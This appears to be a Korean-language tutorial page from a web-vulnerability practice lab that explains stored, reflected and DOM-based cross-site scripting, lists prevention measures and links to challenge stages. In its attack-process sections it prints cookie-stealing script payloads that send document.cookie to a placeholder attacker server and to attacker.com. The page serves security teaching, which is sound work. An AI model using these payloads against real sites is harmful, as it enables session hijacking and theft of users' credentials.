<!DOCTYPE html>
<html lang="ko">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>XSS Introduction</title>
	<link rel="stylesheet" href="./assets/css/styles.css">
	<style>
	pre {
		background-color: #2d2d2d;
		color: #f8f8f2;
		padding: 10px;
		border-radius: 5px;
		overflow-x: auto;
		font-family: Consolas, "Courier New", monospace;
	}
	code {
		font-family: consolas, "Courier new", monospace;
		color: #f8f8f2;
	}
		
		
		body, html {
			margin: 0;
			padding: 0;
			height: 100%;
		}

		.container {
			max-width: 800px;
			margin: 0 auto;
			padding: 20px;
			text-align: center;
			min-height: 100%;
			box-sizing: border-box;
		}

		.button {
			display: inline-block;
			padding: 10px 20px;
			margin: 15px;
			font-size: 16px;
			color: white;
			background-color: #007bff;
			border: non
			border-radius: 5px;
			cursor: pointer;
			text-decoration: none;
		}

		.button:hover {
			background-color: #0056b3;
		}

		.description {
			text-align: left;
			margin: 20px 0;
			line-height: 1.6;
			padding-bottom: 20px;
		}

		.problem-list {
			text-align: left;
			margin-top: 40px;
		}

		.problem-list h3{
			margin-bottom: 10px;
		}
		
		.problem-list ul {
			list-style-type: none;
			padding: 0;
		}
	
		.problem-list ul li {
			margin: 10px 0;
		}

		.problem-list ul li a {
			text-decoration: none;
			color: #007bff;
		}

		.problem-list ul li a:hover {
			color: #0056b3;
			text-decoration: underline;
		}

		.xss-type {
			cursor: pointer;
			color: #007bff;
			text-decoration: underline;
			margin: 10px 0;
		}

		.xss-description {
			display: none;
			margin-top: 10px;
			padding: 10px;
		i	background-color: #f9f9f9;
			border-left: 4px solid #007bff;
		}
	</style>
	<script>
		function toggleDescription(id) {
			var element = document.getElementById(id);

			var isCurrentlyVisible = element.style.display === "block";

			var descriptions = document.getElementsByClassName('xss-description');
			for (var i = 0; i < descriptions.length; i++) {
				descriptions[i].style.display = 'none';
			}

			if (!isCurrentlyVisible) {
				element.style.display = "block";
			}
			
		}
	</script>
</head>
<body>
	<header>
		<div class="container">
			<h1>XSS Introduction</h1>
		</div>
	</header>

	<div class="container">
		<div class="description">
			<h2>XSS (Cross-Site Scripting)?</h2>
			<p><b>Cross-Site Scripting</b>은 '웹 애플리케이션'에서 입력 검증이 부실한 경우, 악성 스크립트를 삽입해 사용자의 브라우저에서 실행되도록 하는 공격입니다.<br>이를 통해서 공격자는 여러 민감한 정보를 탈취할 수 있습니다.</p>
			<h3>XSS 공격 설명</h3>
    <p>
        <strong>크로스 사이트 스크립팅(XSS)</strong>은 웹 애플리케이션에서 발견되는 보안 취약점 중 하나로, 공격자가 악성 스크립트를 삽입하여 다른 사용자가 보는 웹 페이지에 실행되도록 하는 공격입니다. <br>XSS 공격의 간단한 예로 다음과 같은 스크립트를 삽입할 수 있습니다:
    </p>
    <pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
    <p>
	이 스크립트가 실행되면 사용자의 쿠키 정보가 팝업 창에 표시됩니다. 이는 공격자가 세션 쿠키와 같은 민감한 정보를 탈취할 수 있음을 보여줍니다.
    </p>
<h3>XSS 공격 유형</h3>
			<div class="xss-type" onclick="toggleDescription('stored-xss')">Stored XSS (저장형 XSS)</div>
			<div id="stored-xss" class="xss-description">
				<p><strong>저장형 XSS</strong>는 악성 입력이 서버에 영구적으로 저장된 후, 다른 사용자가 해당 데이터를 요청할 때 악성 스크립트가 실행되는 공격 기법입니다.</p>
				<ul>
					<li>공격자는 주로 댓글, 포럼 게시글, 프로필 정보 등의 입력 필드를 통해 악성 스크립트를 삽입합니다.</li>
					<li>이 악성 스크립트는 서버에 저장된 후, 해당 데이터를 조회하는 모든 사용자에게 전송됩니다.</li>
					<li>피해자는 자신도 모르게 악성 스크립트를 실행하게 되며, 이로 인해 쿠키 탈취, 세션 하이재킹 등의 공격이 발생할 수 있습니다.</li>
				</ul>
<h3>공격 과정</h3>
    <p>
        공격자는 취약한 웹 페이지에 악성 스크립트를 삽입하여 사용자가 이 페이지를 방문할 때 스크립트가 실행되도록 합니다. 이 스크립트를 통해 공격자는 쿠키, 세션 토큰 등의 민감한 데이터를 탈취하거나 페이지 내용을 조작할 수 있습니다. 예를 들어:
    </p>
    <ol>
        <li>공격자는 '사용자 입력을 적절히 필터링하지 않는 웹 페이지의 취약점'을 발견하거나 스크립트를 삽입해 체크합니다.</li>
        <li>이 때, 공격자는 POST 메서드를 사용하는 웹페이지이면서, 다른 사용자가 접근할 수 있는 페이지에   다음과 같은 스크립트를 삽입합니다: <pre><code>&lt;script&gt;<br>&nbsp;var img = new Image();<br>&nbsp;img.src = 'http://[공격자의 C&C서버주소]/[입력받을 위치]?cookie=' + document.cookie;<br>&lt;/script&gt;</code></pre></li>
        <li>사용자가 해당 페이지를 방문하면 스크립트가 실행되어 사용자의 쿠키 정보가 공격자의 C&C서버 및 공격자의 파일로 전송됩니다.</li>
	<li>공격자는 이 정보를 악용하여 세션 하이재킹 등의 공격을 시도할 수 있습니다.</li>
	<li>만약, 이 세션이 관리자의 세션이라면 관리자권한으로 웹페이지를 탐색하고 데이터를 탈취할 수 있게 되는 것입니다.</li>
    </ol>
			</div>


			<div class="xss-type" onclick="toggleDescription('reflected-xss')">Reflected XSS (반사형 XSS)</div>
			<div id="reflected-xss" class="xss-description">
				<p><strong>반사형 XSS</strong>는 사용자의 입력이 서버에 의해 처리된 후, 즉시 웹 페이지에 반영되는 방식의 공격 기법입니다. 공격자가 악성 링크나 폼을 통해 사용자를 유도합니다.</p>
				<ul>
					<li>공격자는 악성 스크립트가 포함된 URL을 피해자에게 전달합니다.</li>
					<li>피해자가 링크를 클릭하면, 서버는 해당 입력을 처리하여 반영된 웹 페이지를 반환합니다.</li>
					<li>이때 악성 스크립트가 포함된 페이지가 피해자의 브라우저에서 실행됩니다.</li>
				</ul>
<h3>공격 과정</h3>
    <p>
        공격자는 악성 스크립트가 포함된 URL을 생성합니다. 특히, php파일과 같이 사용자 입력을 그대로 반영하는 웹 애플리케이션의 취약점을 이용합니다. 예를 들어:
    </p>
    <ol>
        <li>공격자는 먼저 사용자의 입력을 반영하는 웹 애플리케이션의 기능을 이용하는 웹페이지에 스크립트를 추가합니다.</li>
        <li>공격자는 다음과 같이 URL에  스크립트를 삽입합니다: <pre><code>http://vulnerable-site.com/search?q=<br>&lt;script&gt;document.location='[공격자의 C&C서버 주소와 경로]?<br>cookie='+document.cookie&lt;/script&gt;</code></pre></li>
	<li>공격자는 만들어진 악성 URL을 이메일, 메시지, 소셜미디어 등을 통해 피해자에게 클릭하도록 유도.</li>
	<li>사용자가 해당URL을 클릭하면 URL에 포함된 스크립트가 실행되어 사용자의 쿠키 정보가 공격자의 C&C서버로 전달됩니다.</li>
	<li>이와 같이, 서버를 통해 쿼리([?키=값]형태)를 전달해 처리받는 방법 말고도, <br>Reflected XSS에는 POST요청을 통한 공격, HTTP헤더, URL 경로 등을 이용하는 기법들이 있습니다.
	<li>공격자는 이렇게 얻은  정보를 악용하여 세션 하이재킹 등의 공격을 시도할 수 있습니다.</li>
	<li>그러나 최근에는 브라우저 측에서 URL에 스크립트가 삽입되는 것를 차단하고 있으므로 위험도를 낮게 평가하는 추세입니다.</li>
    </ol>
			</div>

			<div class="xss-type" onclick="toggleDescription('dom-xss')">DOM-Based XSS (DOM 기반 XSS)</div>
			<div id="dom-xss" class="xss-description">
				<p><strong>DOM 기반 XSS</strong>는 서버가 아닌 클라이언트 측에서 발생하는 공격 기법입니다. 자바스크립트의 DOM(Document Object Model)을 조작하여 악성 스크립트를 실행합니다.</p>
				<ul>
					<li>공격자는 URL, 프래그먼트, 쿠키 등 클라이언트 측에서 접근 가능한 데이터를 조작하여 악성 스크립트를 삽입합니다.</li>
					<li>피해자의 브라우저에서 자바스크립트가 실행될 때, DOM을 통해 악성 스크립트가 실행됩니다.</li>
					<li>이 공격은 서버와 상호작용하지 않고 클라이언트 측에서만 이루어지기 때문에 탐지하기 어렵습니다.</li>
				</ul>
<h3>공격 과정</h3>
	<p>
		공격자는 JavaScript가 사용자 입력을 통해 DOM을 동적으로 변경하는 웹 페이지의 취약점을 발견합니다. </p>
	<ol>
		<li> 취약점을 발견한 공격자는 공격을 위해 다음과 같은 악성 스크립트를 포함한 URL을 생성합니다.
<pre><code>http://vulnerable-site.com/page#<br>&lt;script&gt;document.location='http://attacker.com/steal?<br>cookie='+document.cookie&lt;/script&gt;</code></pre></li>
		<li> 이 URL은 hash('#') 뒤에 있는 스크립트가 브라우저 단에서 실행되도록 유도하며,<br>이는 서버와 상관없이 브라우저 내에서만 발생하는 취약점을 타겟으로 합니다.</li>
		<li>(단, DOM기반 공격에는 hash만 사용되는 것은 아니며, URL 쿼리스트링, 쿠키값 로컬/세션스토리지 등을 이용해 JavaScript가 DOM을 조작하게 합니다.)
		<li>공격자는 이 악성URL을 피해자에게 이메일, 메시지, SNS 등으로  전송해 클릭을 유도합니다.</li>
		<li>피해자가 악성링크를 클릭하면, 브라우저는 페이지를 로드하고 JavaScript코드를 실행하는데,<br> 이때, 서버로 부터 전송받는 페이지는 정상적인 페이지이며,<br> JavaScript가 해시값에 포함된 악성 스크립트를 DOM 요소에 삽입해 실행합니다.</li>
		<li>악성 스크립트가 실행되면 피해자의 브라우저 내에서 '쿠키 및 기타 민감정보'가 공격자의 C&C서버로 전송됩니다.</li>
		<li>공격자는 자신의 서버에서 수신받은 피해자의 정보를 악용할 수 있습니다.
	</ol>		
			</div>
		</div>
<div style="text-align: left;">
<p>이 외에도 공격자가 입력한 Payload가 Server 및 Client 측에서 변형되거나 처리과정에서 자동 변환되어 공격하는 Mutated XSS(MST-XSS).<br>공격코드가 사용자단에서 전혀 노출 되지 않고, 관리자 영역 및 타겟 사용자 영역에서 공격코드가 실행되게 하는 Blind XSS.<br>Self XSS, UXSS, Second-Order XSS 등 다양한 XSS공격 기법들이 존재합니다.</p>
</div>

<div style="text-align: left;">
    <h3>공격자가 XSS로 탈취할 수 있는 정보</h3>
    <ul>
        <li><strong>쿠키:</strong> 세션 정보, 로그인 상태, 인증 토큰 등이 포함될 수 있습니다.</li>
        <li><strong>세션 토큰:</strong> 서버와의 상호작용에서 인증된 사용자를 식별하는 데 사용됩니다.</li>
        <li><strong>사용자 입력 데이터:</strong> 이메일, 비밀번호 등의 개인 정보를 포함할 수 있습니다.</li>
        <li><strong>로컬 및 세션 저장소 데이터:</strong> 클라이언트 측에 저장된 데이터입니다.</li>
        <li><strong>브라우저 정보:</strong> 사용자의 브라우저 및 환경에 대한 정보입니다.</li>
        <li><strong>DOM 객체 조작:</strong> 공격자가 웹 페이지 내용을 변경하거나 가짜 양식을 추가하여 민감한 데이터를 수집할 수 있습니다.</li>
    </ul>

    <h3>예방 방법</h3>
    <ul>
        <li><strong>입력 검증 및 인코딩:</strong> 사용자 입력을 적절히 검증하고 인코딩하여 스크립트 삽입을 방지합니다.</li>
        <li><strong>콘텐츠 보안 정책(CSP):</strong> 실행 가능한 스크립트의 출처를 제한하여 외부 스크립트가 실행되지 않도록 합니다.</li>
        <li><strong>HttpOnly 쿠키 사용:</strong> 쿠키에 HttpOnly 플래그를 설정하여 자바스크립트에서 쿠키에 접근하지 못하도록 합니다.</li>
    </ul>
		</div>
		<p>Proceed to XSS Challenge</p>
		<a href="./stage1/realxss.php" class="button">Stage 1</a>
		<a href="./stage2/Complex_xss.php" class="button">Stage 2</a>
		<div class="problem-list">
			<a href="../index.php" class="button">Home</a>
		</div>
	</div>

	<footer>
		<p>Web Vulnerability Practice &copy; 2024</p>
	</footer>
</body>
</html>
